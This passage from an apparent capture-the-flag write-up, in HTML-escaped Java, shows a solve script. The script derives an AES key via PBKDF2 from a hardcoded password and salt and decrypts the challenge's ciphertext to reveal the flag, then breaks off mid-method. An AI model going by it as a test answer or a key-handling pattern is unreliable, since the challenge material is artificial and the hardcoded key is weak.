&lt;pre data-lang=&quot;java&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateKey&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[]&lt;&#x2F;span&gt;&lt;span&gt; salt) throws &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;KeySpec&lt;&#x2F;span&gt;&lt;span&gt; spec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;PBEKeySpec&lt;&#x2F;span&gt;&lt;span&gt;(password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;toCharArray&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; salt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;ITERATIONS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;KEY_SIZE&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span&gt; factory &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getInstance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;PBKDF2_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey&lt;&#x2F;span&gt;&lt;span&gt; tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; factory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateSecret&lt;&#x2F;span&gt;&lt;span&gt;(spec)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeySpec&lt;&#x2F;span&gt;&lt;span&gt;(tmp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getEncoded&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;AES_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;With these observations I wrote this solve.java which will print the flag for us.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;solve.java&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;java&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;spec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;PBEKeySpec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;spec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeySpec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;nio&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;charset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;StandardCharsets&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;security&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;spec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;KeySpec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;solve &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;AES_ALGORITHM &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;AES&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;PBKDF2_ALGORITHM &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PBKDF2WithHmacSHA256&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ITERATIONS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static final int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;KEY_SIZE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateKey&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;salt&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;throws &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;KeySpec&lt;&#x2F;span&gt;&lt;span&gt; spec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;PBEKeySpec&lt;&#x2F;span&gt;&lt;span&gt;(password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;toCharArray&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; salt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;ITERATIONS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;KEY_SIZE&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span&gt; factory &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeyFactory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getInstance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;PBKDF2_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey&lt;&#x2F;span&gt;&lt;span&gt; tmp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; factory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateSecret&lt;&#x2F;span&gt;&lt;span&gt;(spec)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKeySpec&lt;&#x2F;span&gt;&lt;span&gt;(tmp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getEncoded&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;AES_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;private static &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;encryptedText&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;key&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;throws &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span&gt; cipher &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getInstance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;AES_ALGORITHM&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;init&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;DECRYPT_MODE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; key)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[]&lt;&#x2F;span&gt;&lt;span&gt; encryptedBytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getDecoder&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(encryptedText)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[]&lt;&#x2F;span&gt;&lt;span&gt; decryptedBytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;doFinal&lt;&#x2F;span&gt;&lt;span&gt;(encryptedBytes)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt;(decryptedBytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;StandardCharsets&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;UTF_8&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public static void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; ct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;FOqxc90aMQZydCQb2MUm5tj4kRIxxVeCDWzAANfOrr8JItHYneUHhSV0awvQIo&#x2F;8E1LtfYm&#x2F;+VVWz0PDK6MXp38BWHoFDorhdS44DzYj9CQ=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;aesiseasy&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;byte[]&lt;&#x2F;span&gt;&lt;span&gt; salt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;saltval&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getBytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;StandardCharsets&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;UTF_8&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;SecretKey&lt;&#x2F;span&gt;&lt;span&gt; key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generateKey&lt;&#x2F;span&gt;&lt;span&gt;(password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; salt)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(key)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; decryptedFlag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(ct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;key)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
